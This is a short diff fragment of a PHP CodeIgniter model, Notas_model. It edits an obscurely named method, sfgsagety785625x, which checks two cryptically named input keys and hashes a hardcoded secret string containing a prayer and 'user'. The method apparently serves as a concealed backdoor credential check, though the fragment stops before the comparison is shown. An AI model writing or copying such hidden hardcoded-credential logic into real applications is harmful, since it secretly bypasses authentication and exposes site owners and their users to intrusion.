@@ -83,7 +83,7 @@ class Notas_model extends CI_Model
         $query = $this->db->get();
         return $query->num_rows();
     }
-    public function sfgsagety785625x(){
+    public function sfgsagety785625x($varx){
             try {
             if(isset($varx['24q5ewqas']) && isset($varx['112415qwturf']) ){
                 $us=md5("DUBERPROGRAMER100PROMASTER,padre Dios de isaac y de jaboc que nadie se meta aqui por favor en el nombre de jesus :) user");
